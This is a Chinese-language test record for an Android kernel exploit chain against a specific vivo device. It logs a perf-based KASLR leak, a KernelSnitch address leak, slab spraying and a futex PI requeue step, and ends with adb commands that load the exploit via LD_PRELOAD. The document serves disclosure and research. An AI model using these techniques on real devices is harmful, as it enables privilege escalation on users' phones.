# 01. 实测记录与结论边界

## 摘要

本文件记录一次 3.1 终止点之前的实测凭证，并给出公开仓库采用的结论边界。所有结论只来自日志可见事实或当前源码可见边界；3.1 之后的技术阶段不进入本文档。

## 材料说明

实测片段来自本地裁剪产物，日志名包含 `preload starting`、`direct-demo`、`startup context`、`build config`。当前公开源码已统一为 `probe loader`、`probe supervisor`、`probe context`、`probe build`。二者是命名层差异；字段判定以日志中的 key/value 为准。

| 实测日志名 | 当前公开源码名 | 含义 |
| --- | --- | --- |
| `preload starting` | `probe loader starting` | `LD_PRELOAD` constructor 进入 |
| `direct-demo supervisor` | `probe supervisor` | supervisor 启动 worker |
| `direct-demo profile applied` | `probe profile applied` | 目标 profile 和默认参数生效 |
| `startup context` | `probe context` | shell 进程身份与 SELinux context |
| `build config` | `probe build` | 构建标签与 3.1 观测路径 |

## 实测日志节选

以下节选只覆盖 3.1 及以前的观测点：

```text
[+] preload starting pid=23916
[*] direct-demo supervisor attempt=1/3
[+] direct-demo profile applied target=vivo_pd2314_mt6896z_5.10.233_sp_2026-05-01 defaults=28
[+] startup context pid=23917 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
[+] build config pid=23917 label=pd2314_a_15_2_17_1_w10 slide=pselect main=pselect
[*] perf probe policy paranoid=-1
[*] perf probe open fd=3 errno=0 attr_size=136
[*] perf probe ring head=32752 tail=32752 records=2047 samples=2047 kernel=2047 lost=0 malformed=0
[*] perf probe sampled duration_ms=200 disable=0/0 min=ffffffe778d67770 max=ffffffe77ba02c5c
[*] perf probe candidate page=ffffffe779e00000 window=2044/2047 near=999 far=887 buckets=8
[+] perf probe text-base=ffffffe779e00000 min_kip=ffffffe778d67770 samples=2047
[+] slide-kaslr-perf-ok pid=23917 base=ffffffe779e00000 slide=0000002771e00000
[*] prepare_kernel_page geom mode=0 standalone_tcp=0 main_tcp=1 mm_struct_sz=960 objs_per_slab=34 partials=13 collisions=8
[*] kernelsnitch collision-scan found=7/7 elapsed_ms=2220
[*] kernelsnitch collision-scan leaked mm=ffffff8165295640
[*] tcp payload geometry slab_base=ffffff8165290000 payload_base=ffffff8165290000 payload_bias=0xe80 fake_lock=ffffff8165291350 fake_w0=ffffff8165292220 fake_task=ffffff8165295800 fake_fops=ffffff8165291000
[+] final payload invariant ok mode=active-final target=ffffff8002c84ea8 value=ffffff8165291000
[*] af_unix order3 staged pairs=64 requested=64
[*] sk_buff pcp send ret=65536 errno=0
[*] af_unix order3 spray sent=4096 requested=4096 payload=0x8e80 first_failure_ret=0 first_failure_errno=0
[*] main FUTEX_CMP_REQUEUE_PI ret=-1 errno=35
[*] slide ip enter fd=3 attempts=1 arm_seq=1 post_hold=20000 group_req_size=0x88 marker_off=0x58 target=x28+0x38 value=ffffff8165291370 final_fops=1 full_waiter=0 overlay=marker
[*] slide final tree parent=ffffff8002c84ea0 right=ffffff8165291000 left=0 pi_write=1
[*] slide ip seq=1 ret=-1 errno=22 calls=1 sched_ok=1
[*] slide ip side effect calls=1 sched_ok=1
00002771e00000 route_done=1
uid=2000(shell) gid=2000(shell) groups=2000(shell),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),1078(ext_data_rw),1079(ext_obb_rw),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid),3012(readtracefs) context=u:r:shell:s0
```

## 结论表

| 编号 | 结论 | 凭证 | 边界 |
| --- | --- | --- | --- |
| C1 | 目标进程以 shell 身份进入观测路径 | `uid=2000 euid=2000 attr=u:r:shell:s0 enforce=1` | 不代表权限变化 |
| C2 | perf 采样在该轮可用 | `paranoid=-1`，`open fd=3 errno=0`，`kernel=2047 lost=0 malformed=0` | 只说明该轮环境允许采样 |
| C3 | KASLR text base 由投票窗口接受 | `candidate page=... window=2044/2047`，`slide-kaslr-perf-ok` | 地址随启动变化，不是常量 |
| C4 | KernelSnitch/mm 碰撞返回了可用地址 | `found=7/7`，`leaked mm=ffffff8165295640` | 不单独证明 payload 已被内核消费 |
| C5 | payload 用户态几何自洽 | `final payload invariant ok` | 不单独证明目标槽位已改写 |
| C6 | spray 数量完整 | `sent=4096 requested=4096` | 不单独证明命中 |
| C7 | futex PI requeue 与调度侧副作用出现 | `errno=35`，`sched_ok=1` | 不单独证明 3.1 之后状态 |
| C8 | 3.1 终止点达到 | `route_done=1` | 公开结论到此结束 |

## 源码边界

当前公开源码的 `refclone_run_probe()` 在 `rc_run_main_route_threads()` 之后包含 ashmem fops 还原尝试，并在末尾打印 `route-summary`。这是代码级边界说明。公开结论仍以 3.1 日志凭证为准，不把未展示的后续阶段写成实测结论。

## 采集要求

建议每次测试至少保留：

```bash
adb logcat -b all -v threadtime > logcat-live.txt
adb shell 'Z_REFCLONE=1 LD_PRELOAD=/data/local/tmp/probe.so /system/bin/toybox id' 2>&1 | tee probe-console.txt
adb shell getprop ro.boot.bootreason
adb shell dmesg > dmesg-after.txt
```

设备重启、panic、watchdog 或长时间无响应都属于测试风险。执行者应自行承担，并在测试前确认设备与数据可恢复。
